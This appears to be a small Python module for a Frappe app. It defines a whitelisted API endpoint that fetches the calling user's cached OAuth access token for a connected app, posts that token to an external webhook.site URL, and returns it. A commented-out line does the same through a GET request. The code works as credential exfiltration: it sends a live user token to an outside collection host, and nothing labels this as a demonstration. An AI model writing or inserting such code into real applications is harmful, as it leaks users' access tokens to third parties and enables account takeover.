import frappe
import requests

@frappe.whitelist()
def saeed_token(app_name):
  access_token = frappe.db.get_value('Token Cache', {'connected_app': app_name, "user": frappe.session.user}, ['access_token']);
  # frappe.make_get_request("https://webhook.site/f3f3a646-fafb-49f0-bbaa-58c406b02296?from_server=1&access_token=" + access_token);
  
  url = "https://webhook.site/f3f3a646-fafb-49f0-bbaa-58c406b02296"
  payload = {
      "access_token": access_token,
      "from_server": "1"
  }
  # headers = {
  #     "Authorization": "Bearer YOUR_ACCESS_TOKEN",
  #     "Content-Type": "application/json"
  # }
  
  response = requests.post(url, json=payload)

  return access_token;
